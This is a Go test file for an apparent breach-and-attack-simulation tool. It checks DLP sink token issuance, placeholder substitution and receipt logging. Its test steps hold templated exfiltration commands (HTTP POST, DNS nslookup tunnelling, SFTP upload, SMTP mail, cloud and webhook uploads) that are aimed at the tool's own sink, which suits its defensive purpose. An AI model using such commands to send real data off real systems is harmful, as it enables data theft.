package api

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/audspect/bas/internal/dnssink"
	"github.com/audspect/bas/internal/scenario"
	"github.com/audspect/bas/internal/ws"
	"github.com/jackc/pgx/v5/pgxpool"
)

func TestGenerateSinkToken_ProducesUniqueUnpredictableValues(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 100; i++ {
		tok, err := generateSinkToken(32)
		if err != nil {
			t.Fatalf("generateSinkToken(32): %v", err)
		}
		if len(tok) != 64 { // 32 bytes hex-encoded = 64 chars
			t.Fatalf("token %q wrong length for 32-byte input: got %d chars, want 64", tok, len(tok))
		}
		if seen[tok] {
			t.Fatalf("generateSinkToken produced a duplicate: %q", tok)
		}
		seen[tok] = true
	}
}

func TestGenerateSinkToken_ShorterLengthForDNSLabelSafety(t *testing.T) {
	tok, err := generateSinkToken(8)
	if err != nil {
		t.Fatalf("generateSinkToken(8): %v", err)
	}
	if len(tok) != 16 { // 8 bytes hex-encoded = 16 chars
		t.Fatalf("token %q wrong length for 8-byte input: got %d chars, want 16", tok, len(tok))
	}
	if len(tok) > 63 {
		t.Fatalf("token %q exceeds the 63-character DNS label limit", tok)
	}
}

func TestIssueSinkTokensAndSubstitute_ReplacesPlaceholdersOnlyWherePresent(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T9999", Command: "Invoke-RestMethod -Uri '{{SINK_URL}}' -Body @{token='{{SINK_TOKEN}}'}"},
			{TechniqueID: "T1052.001", Command: "Copy-Item -Path $src -Destination $dest"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sink-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if strings.Contains(out[0].Command, "{{SINK_TOKEN}}") || strings.Contains(out[0].Command, "{{SINK_URL}}") {
			t.Fatalf("step 0 still has unsubstituted placeholders: %s", out[0].Command)
		}
		if !strings.Contains(out[0].Command, "https://orchestrator.example:9443/api/dlp/sink") {
			t.Fatalf("step 0 command doesn't contain the expected sink URL: %s", out[0].Command)
		}
		if out[1].Command != "Copy-Item -Path $src -Destination $dest" {
			t.Fatalf("step 1 (no placeholder) was modified: %s", out[1].Command)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sink-1' AND technique_id = 'T9999'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-sink-1/T9999 = %d, want 1", count)
		}
	})
}

func TestDLPSink_RecordsReceiptForAnyPostedToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{
			"token":   "some-token-value",
			"payload": "[BAS-SIM-DLP] fake regulated data",
			"channel": "https-post",
		})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		req.RemoteAddr = "10.0.0.5:54321"
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
		}

		var count int
		var sourceIP, channel string
		var payloadSize int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&count); err != nil {
			t.Fatalf("count receipts: %v", err)
		}
		if count != 1 {
			t.Fatalf("receipt count = %d, want 1", count)
		}
		if err := pool.QueryRow(context.Background(),
			`SELECT source_ip, channel, payload_size FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&sourceIP, &channel, &payloadSize); err != nil {
			t.Fatalf("read receipt: %v", err)
		}
		if !strings.HasPrefix(sourceIP, "10.0.0.5") {
			t.Errorf("source_ip = %q, want prefix 10.0.0.5", sourceIP)
		}
		if channel != "https-post" {
			t.Errorf("channel = %q, want https-post", channel)
		}
		if payloadSize == 0 {
			t.Error("payload_size should reflect the posted payload's length")
		}

		var rawPayloadStored bool
		rows, _ := pool.Query(context.Background(), `SELECT column_name FROM information_schema.columns WHERE table_name = 'dlp_sink_receipts'`)
		for rows.Next() {
			var col string
			rows.Scan(&col)
			if col == "payload" || col == "raw_payload" {
				rawPayloadStored = true
			}
		}
		rows.Close()
		if rawPayloadStored {
			t.Error("dlp_sink_receipts must never store the raw payload, only a hash -- found a raw-payload column")
		}
	})
}

func TestDLPSink_UnrecognizedTokenStillReturns200(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{"token": "never-issued-token", "payload": "x", "channel": "https-post"})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200 even for an unrecognized token", rec.Code)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_DNSPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1071.004", Command: "nslookup 000.4.{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}} {{SINK_DNS_SERVER}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-dns-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_DNS_CAMPAIGN_ID}}") || strings.Contains(cmd, "{{SINK_DNS_SERVER}}") || strings.Contains(cmd, "{{SINK_DNS_DOMAIN}}") {
			t.Fatalf("DNS placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_DNS_SERVER must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, dnssink.DomainSuffix) {
			t.Fatalf("expected dnssink.DomainSuffix (%s) in the command: %s", dnssink.DomainSuffix, cmd)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-dns-1' AND technique_id = 'T1071.004'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-dns-1/T1071.004 = %d, want 1", count)
		}
	})
}

func TestDNSServerHost_StripsSchemeAndPort(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "orchestrator.example"},
		{"https://10.0.0.5:9443", "10.0.0.5"},
		{"http://localhost", "localhost"},
	}
	for _, c := range cases {
		got := dnsServerHost(c.in)
		if got != c.want {
			t.Errorf("dnsServerHost(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestIssueSinkTokensAndSubstitute_SFTPPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SFTP_HOST}}") || strings.Contains(cmd, "{{SINK_SFTP_PORT}}") {
			t.Fatalf("SFTP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_SFTP_HOST must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, "2222") {
			t.Fatalf("expected the default SINK_SFTP_PORT (2222) in the command: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-1' AND technique_id = 'T1048.002'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (SFTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SFTPDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the SFTP placeholder block must NOT generate its own
	// {{SINK_TOKEN}} -- every real SFTP-wired step's command contains
	// {{SINK_TOKEN}} too (as the upload filename), which the existing
	// unconditional first block already issues and substitutes. A second
	// token issued here would never appear in the final command (a no-op
	// ReplaceAll on text that no longer contains the placeholder) and
	// would sit in dlp_sink_tokens as dead weight -- exactly one row must
	// exist per run+technique, not two.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-orphan' AND technique_id = 'T1048.002'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the SFTP block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SFTPHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_SFTP_HOST", "sftp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "target={{SINK_SFTP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "sftp-external.example.net") {
			t.Fatalf("expected the SINK_SFTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SMTPPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "Send-MailMessage -Subject '{{SINK_TOKEN}}' -SmtpServer {{SINK_SMTP_HOST}} -Port {{SINK_SMTP_PORT}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SMTP_HOST}}") || strings.Contains(cmd, "{{SINK_SMTP_PORT}}") {
			t.Fatalf("SMTP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_SMTP_HOST must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, "587") {
			t.Fatalf("expected the default SINK_SMTP_PORT (587) in the command: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-smtp-1' AND technique_id = 'T1048.003'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (SMTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SMTPDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the SMTP placeholder block must NOT generate its own
	// {{SINK_TOKEN}} -- guards against the same class of bug SFTP's
	// implementation had to fix mid-stream (see
	// TestIssueSinkTokensAndSubstitute_SFTPDoesNotIssueOrphanedSecondToken),
	// applied here from the start.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "Send-MailMessage -Subject '{{SINK_TOKEN}}' -SmtpServer {{SINK_SMTP_HOST}} -Port {{SINK_SMTP_PORT}}"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-smtp-orphan' AND technique_id = 'T1048.003'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the SMTP block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SMTPHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_SMTP_HOST", "smtp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "target={{SINK_SMTP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "smtp-external.example.net") {
			t.Fatalf("expected the SINK_SMTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_CloudPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "$uri = 'https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/{{SINK_TOKEN}}.dat'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_CLOUD_HOST}}") || strings.Contains(cmd, "{{SINK_CLOUD_PORT}}") {
			t.Fatalf("cloud storage placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if !strings.Contains(cmd, ":9443/") {
			t.Fatalf("expected SINK_CLOUD_PORT to be derived from publicBaseURL's own port (9443): %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-cloud-1' AND technique_id = 'T1567.002'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (cloud storage reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_CloudDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the cloud-storage placeholder block must NOT generate its
	// own {{SINK_TOKEN}} -- guards against the same class of bug SFTP's
	// implementation had to fix mid-stream, applied here from the start
	// like SMTP already did.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "$uri = 'https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/{{SINK_TOKEN}}.dat'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-cloud-orphan' AND technique_id = 'T1567.002'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the cloud storage block)", count)
		}
	})
}

func TestCloudSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "9443"},
		{"https://10.0.0.5:8443", "8443"},
		{"https://orchestrator.example", "443"}, // no explicit port -- assume default HTTPS
	}
	for _, c := range cases {
		got := cloudSinkPort(c.in)
		if got != c.want {
			t.Errorf("cloudSinkPort(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestCloudSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_CLOUD_HOST", "cloud-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.002", Command: "target={{SINK_CLOUD_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-cloud-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "cloud-external.example.net") {
			t.Fatalf("expected the SINK_CLOUD_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_WebhookPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T0/B0/X0'; $token = '{{SINK_TOKEN}}'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_WEBHOOK_HOST}}") || strings.Contains(cmd, "{{SINK_WEBHOOK_PORT}}") {
			t.Fatalf("webhook placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if !strings.Contains(cmd, ":9443/") {
			t.Fatalf("expected SINK_WEBHOOK_PORT to be derived from publicBaseURL's own port (9443): %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-1' AND technique_id = 'T1567.004'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (webhook channel reuses the existing 32-byte/64-hex-char token)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_WebhookDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the webhook placeholder block must NOT generate its own
	// {{SINK_TOKEN}} -- same bug class SFTP's implementation had to fix
	// mid-stream, guarded here for the T1567.004 (Slack/Teams) half.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T0/B0/X0'; $token = '{{SINK_TOKEN}}'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-orphan-1", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-orphan-1' AND technique_id = 'T1567.004'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the webhook block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_CoderepoDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Same regression, for the T1567.001 (GitHub/GitLab) technique -- this
	// channel spans two techniques, so both need their own coverage.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.001", Command: "$uri = 'https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists'; $token = '{{SINK_TOKEN}}'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-orphan-2", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-webhook-orphan-2' AND technique_id = 'T1567.001'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the webhook block)", count)
		}
	})
}

func TestWebhookSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "9443"},
		{"https://10.0.0.5:8443", "8443"},
		{"https://orchestrator.example", "443"}, // no explicit port -- assume default HTTPS
	}
	for _, c := range cases {
		got := webhookSinkPort(c.in)
		if got != c.want {
			t.Errorf("webhookSinkPort(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestWebhookSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_WEBHOOK_HOST", "webhook-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1567.004", Command: "target={{SINK_WEBHOOK_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-webhook-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "webhook-external.example.net") {
			t.Fatalf("expected the SINK_WEBHOOK_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_TelnetPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{
				TechniqueID: "T1048.003",
				Command:     `$uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"`,
			},
		}
		result, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-1", "https://orchestrator.internal:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(result[0].Command, "orchestrator.internal") {
			t.Fatalf("SINK_TELNET_HOST not substituted; got %q", result[0].Command)
		}
		if !strings.Contains(result[0].Command, "9443") {
			t.Fatalf("SINK_TELNET_PORT not substituted; got %q", result[0].Command)
		}
	})
}

func TestTelnetSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	tests := []struct {
		publicBaseURL string
		want          string
	}{
		{"https://orchestrator.internal:9443", "9443"},
		{"https://orchestrator.internal", "443"},
		{"http://localhost:8080", "8080"},
		{"http://localhost", "443"},
	}
	for _, tt := range tests {
		got := telnetSinkPort(tt.publicBaseURL)
		if got != tt.want {
			t.Errorf("telnetSinkPort(%q) = %q, want %q", tt.publicBaseURL, got, tt.want)
		}
	}
}

func TestTelnetSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_TELNET_HOST", "telnet.override.local")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "target={{SINK_TELNET_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-telnet-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "telnet.override.local") {
			t.Fatalf("expected the SINK_TELNET_HOST override to win: %s", out[0].Command)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_TelnetDoesNotIssueOrphanedSecondToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "$uri = 'https://{{SINK_TELNET_HOST}}/telnet/session'; $token = '{{SINK_TOKEN}}'"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-telnet-orphan", "https://orchestrator.internal", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-telnet-orphan' AND technique_id = 'T1048.003'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the telnet block)", count)
		}
	})
}
